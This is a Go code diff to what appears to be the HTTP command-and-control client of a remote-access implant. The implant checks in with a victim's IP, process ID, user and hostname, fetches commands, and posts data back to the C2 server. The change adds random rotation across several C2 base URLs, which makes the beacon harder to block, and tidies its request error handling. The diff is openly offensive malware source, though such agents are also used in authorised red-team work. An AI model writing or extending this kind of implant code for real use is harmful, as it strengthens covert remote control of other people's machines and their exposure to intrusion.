@@ -36,6 +36,7 @@ var (
 type C2Patchthrough struct {
 	HostHeader     string
 	BaseURL        string
+	BaseURLs       []string
 	Interval       int
 	Commands       []string
 	ExchangingKeys bool
@@ -59,11 +60,23 @@ func (c *C2Patchthrough) SetHeader(newHeader string) {
 }
 
 func (c C2Patchthrough) URL() string {
-	return c.BaseURL
+	if len(c.BaseURLs) == 0 {
+		return c.BaseURL
+	} else {
+		return c.getRandomBaseURL()
+	}
+}
+
+func (c *C2Patchthrough) getRandomBaseURL() string {
+	return c.BaseURLs[seededRand.Intn(len(c.BaseURLs))]
 }
 
 func (c *C2Patchthrough) SetURL(newURL string) {
 	c.BaseURL = newURL
+}
+
+func (c *C2Patchthrough) SetURLs(newURLs []string) {
+	c.BaseURLs = newURLs
 }
 
 func (c C2Patchthrough) SleepInterval() int {
@@ -164,6 +177,7 @@ func (c *C2Patchthrough) CheckIn(ip string, pid int, user string, host string) i
 	err := json.Unmarshal(resp, &respMsg)
 	if err != nil {
 		//log.Printf("Error in unmarshal:\n %s", err.Error())
+		return respMsg
 	}
 
 	return respMsg
@@ -228,7 +242,12 @@ func (c *C2Patchthrough) htmlPostData(urlEnding string, sendData []byte) []byte 
 	}
 
 	contentLength := len(sendData)
-	req, _ := http.NewRequest("POST", url, bytes.NewBuffer(sendData))
+	req, err := http.NewRequest("POST", url, bytes.NewBuffer(sendData))
+	if err != nil {
+		//log.Printf("Error creating http POST request: %s", err.Error())
+		return make([]byte, 0)
+	}
+
 	req.ContentLength = int64(contentLength)
 	req.Header.Set("User-Agent", c.GetUserAgent())
 
@@ -242,7 +261,7 @@ func (c *C2Patchthrough) htmlPostData(urlEnding string, sendData []byte) []byte 
 	resp, err := client.Do(req)
 
 	if err != nil {
-		//log.Println("Error in http POST request: ", err.Error())
+		//log.Printf("Error in http POST request: %s", err.Error())
 		return make([]byte, 0)
 	}
 
@@ -270,7 +289,7 @@ func (c *C2Patchthrough) htmlGetData(url string) []byte {
 
 	req, err := http.NewRequest("GET", url, nil)
 	if err != nil {
-		//fmt.Sprintf("Error completing GET request: %s", err)
+		//log.Printf("Error completing GET request: %s", err)
 		return make([]byte, 0)
 	}
 
@@ -283,10 +302,12 @@ func (c *C2Patchthrough) htmlGetData(url string) []byte {
 	resp, err := client.Do(req)
 
 	if err != nil {
+		//log.Printf("Error in request: %s", err.Error())
 		return make([]byte, 0)
 	}
 
 	if resp.StatusCode != 200 {
+		//log.Printf("Did not receive 200 response: %d", resp.StatusCode)
 		return make([]byte, 0)
 	}
 
